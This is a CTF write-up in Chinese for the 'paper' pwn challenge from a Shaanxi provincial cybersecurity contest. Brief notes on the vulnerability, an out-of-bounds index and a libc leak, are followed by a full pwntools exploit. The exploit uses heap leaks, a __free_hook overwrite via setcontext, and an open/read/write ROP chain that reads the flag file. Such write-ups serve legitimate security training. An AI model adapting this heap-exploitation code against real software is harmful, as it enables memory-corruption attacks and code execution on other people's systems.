---
title: 陕西省第一届网络安全比赛 pwn
date: 2021-07-21 04:35:17
categories:
  - pwn
---


## paper

### 思路
* 泄露libc 当fastbin里没有合适的，在unsorted bin内分割，从而遗留了fd bk
* 漏洞点在 论文查重有个数组越界
* 还有一种泄露environ的方式解题
* 这道题某些功能逻辑生硬 就不留附件了意义
### exp 
```python
#_*_coding:utf-8_*_
#!/usr/bin/env python
import time
import struct
from pwn import *

re = 0
context.log_level = "debug"

if re:
	p = process("./paper",env={"LD_PRELOAD":"./libc-2.23.so"})
	libc = ELF("./libc-2.23.so")
else:
	p = process("./paper")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

def add(name,key_word,size=None,content=None):
	p.recvuntil(">> ")
	p.sendline("1")
	p.recvuntil("Please input the name of Paper\n")
	p.sendline(name)
	p.recvuntil("Please input the key_word\n")
	p.sendline(str(key_word))
	if(key_word > 99999):
		p.recvuntil("Please input the size of Paper\n")
		p.sendline(str(size))
		p.recvuntil("please input content:\n")
		p.sendline(content)


def show(id):
	p.recvuntil(">> ")
	p.sendline("4")
	p.recvuntil("Please input the index:\n")
	p.sendline(str(id))
	p.recvuntil("name:\n")
	return p.recvuntil("content:\nDone\n",drop=True)


def check(id,other,offset=None,value=None):
	p.recvuntil(">> ")
	p.sendline("5")
	p.recvuntil("Please input the index of your paper:\n")
	p.sendline(str(id))
	p.recvuntil("Please input the index of others:\n")
	p.sendline(str(other))
	if "Please rewrite~\n" in p.recvuntil("\n"):
		p.recvuntil("Your new size:\n")
		p.sendline(str(0x60+1))
		p.recvuntil("too big\n")
		return int(p.recvuntil("\n"),16)
	if "The age of your teacher?" in p.recvuntil("\n"):
		p.sendline(str(offset))
		p.send(p64(value)[:7])


def edit(id,name,content):
	p.recvuntil(">> ")
	p.sendline("3")
	p.recvuntil("Please input the index:\n")
	p.sendline(str(id))
	p.recvuntil("name:\n")
	p.sendline(name)
	p.recvuntil("content:\n")
	p.sendline(content)

def free(id):
	p.recvuntil(">> ")
	p.sendline("2")
	p.recvuntil("Please input the index:\n")
	p.sendline(str(id))

add("physics",99)
heap = u64(show(0)[8:-1].ljust(8,"\x00")) - 0x1680
print("heap => 0x%x"%heap)


for _ in range(10):
	add("physics",99)
main_arena_312 = u64(show(0)[8:-1].ljust(8,"\x00"))
print("main_arena+312 => 0x%x"%main_arena_312)
malloc_hook = main_arena_312 - 312 -0x10
libc.address = malloc_hook - libc.sym["__malloc_hook"]


add("0"*7,999999,0x60,"0"*7) #id 0
add("1"*7,999999,0x60,"1"*7) #id 1
bss_array = check(0,1) - 0x5c + 0x60
print("bss => 0x%x"%bss_array)
'''
0x55f5f92874b0
-
0x55f5f9286000
= 0x14b0
'''
payload = ""
payload += p64(heap + 0x14b0)
add("2"*7,999999,0x60,payload) #id 2

'''
0x55a32f8d5e00	
- 
0x55a32f8d5000
= 0xe00
'''

ptr = heap + 0xe00
offset = (ptr - bss_array)/8
value = bss_array - 0x60 + 0x48
print("offset => %d",offset)
check(0,1,offset,value)


payload = ""
payload += "fakename"
payload += struct.pack("ii",0x1000,0x1000)
payload += p64(libc.sym["__free_hook"])

payload += "fakename"
payload += struct.pack("ii",0x1000,0x1000)
payload += p64(heap+0x3000)

add("3"*7,999999,0x60,payload) #id 3

payload = ""
payload += struct.pack("i",-9999)*5
payload += struct.pack("i",2)
payload += p64(heap + 0x12e0)
payload += p64(heap + 0x12f8)
edit(1,"1"*7,payload)

#### local libc
setcontext53 = 0x0000000000047b85 + libc.address
pop_rdi = 0x0000000000021112 + libc.address #: pop rdi ; ret
pop_rsi = 0x00000000000202f8 + libc.address #: pop rsi ; ret
pop_rdx = 0x0000000000001b92 + libc.address #: pop rdx ; ret
pop_rax = 0x000000000003a738 + libc.address #: pop rax ; ret
syscall = 0x00000000000bc3f5 + libc.address #<+5>:	syscall 
#### additional libc
setcontext53 = 0x0000000000047b85 + libc.address
pop_rdi = 0x0000000000021112 + libc.address #: pop rdi ; ret
pop_rsi = 0x00000000000202f8 + libc.address #: pop rsi ; ret
pop_rdx = 0x0000000000001b92 + libc.address #: pop rdx ; ret
pop_rax = 0x000000000003a738 + libc.address #: pop rax ; ret
syscall = 0x00000000000bc3f5 + libc.address #<+5>:	syscall 
####

payload = ""
payload += p64(setcontext53)
edit(0,"0"*7,payload)

rop = ""
rop += "./flag\x00".ljust(8,"\x00")
rop += p64(0)*12
rop += p64(heap+0x3000)
rop += p64(0)*6
rop += p64(heap+0x30b0)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(pop_rdx)
rop += p64(7)
rop += p64(pop_rax)
rop += p64(0x2)
rop += p64(syscall)
rop += p64(pop_rdi)
rop += p64(3)
rop += p64(pop_rsi)
rop += p64(heap+0x100)
rop += p64(pop_rdx)
rop += p64(0x80)
rop += p64(pop_rax)
rop += p64(0)
rop += p64(syscall)
rop += p64(pop_rdi)
rop += p64(1)
rop += p64(pop_rax)
rop += p64(1)
rop += p64(syscall)
edit(1,"1"*7,rop)
raw_input()
free(1)
p.interactive()
```
